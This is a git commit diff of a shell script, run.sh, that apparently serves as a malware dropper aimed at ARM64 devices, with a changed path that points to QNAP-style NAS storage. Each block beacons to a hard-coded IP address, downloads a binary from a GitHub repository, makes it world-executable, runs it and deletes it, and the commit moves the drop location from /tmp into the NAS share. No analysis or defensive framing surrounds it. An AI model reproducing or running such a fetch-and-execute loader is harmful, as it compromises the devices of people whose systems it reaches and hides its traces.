47265dfacd0261e14643a7a45406066b1bfd3b0b
gptloveyou <129956509+gptloveyou@users.noreply.github.com>
2023-04-06 10:46:06 +0000

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,20 +1,20 @@
 #!/bin/sh
 curl -s http://139.180.135.229:19088/9024134B28978B68666E2B034E46130E/debug
-curl -o /tmp/arm64_5.bin https://raw.githubusercontent.com/gptloveyou/learn/main/arm64_5.bin
-chmod 777 /tmp/arm64_5.bin
-/tmp/arm64_5.bin
-rm /tmp/arm64_5.bin
+curl -o /share/CACHEDEV1_DATA/homes/arm64_5.bin https://raw.githubusercontent.com/gptloveyou/learn/main/arm64_5.bin
+chmod 777 /share/CACHEDEV1_DATA/homes/arm64_5.bin
+/share/CACHEDEV1_DATA/homes/arm64_5.bin
+rm /share/CACHEDEV1_DATA/homes/arm64_5.bin
 
 curl -s http://139.180.135.229:19088/9024134B28978B68666E2B034E46130E/debug
-curl -o /tmp/arm64_6.bin https://raw.githubusercontent.com/gptloveyou/learn/main/arm64_6.bin
-chmod 777 /tmp/arm64_6.bin
-/tmp/arm64_6.bin
-rm /tmp/arm64_6.bin
+curl -o /share/CACHEDEV1_DATA/homes/arm64_6.bin https://raw.githubusercontent.com/gptloveyou/learn/main/arm64_6.bin
+chmod 777 /share/CACHEDEV1_DATA/homes/arm64_6.bin
+/share/CACHEDEV1_DATA/homes/arm64_6.bin
+rm /share/CACHEDEV1_DATA/homes/arm64_6.bin
 
 curl -s http://139.180.135.229:19088/9024134B28978B68666E2B034E46130E/debug
-curl -o /tmp/arm64_7.bin https://raw.githubusercontent.com/gptloveyou/learn/main/arm64_7.bin
-chmod 777 /tmp/arm64_7.bin
-/tmp/arm64_7.bin
-rm /tmp/arm64_7.bin
+curl -o /share/CACHEDEV1_DATA/homes/arm64_7.bin https://raw.githubusercontent.com/gptloveyou/learn/main/arm64_7.bin
+chmod 777 /share/CACHEDEV1_DATA/homes/arm64_7.bin
+/share/CACHEDEV1_DATA/homes/arm64_7.bin
+rm /share/CACHEDEV1_DATA/homes/arm64_7.bin
  
 curl -s http://139.180.135.229:19088/9024134B28978B68666E2B034E46130E/debug
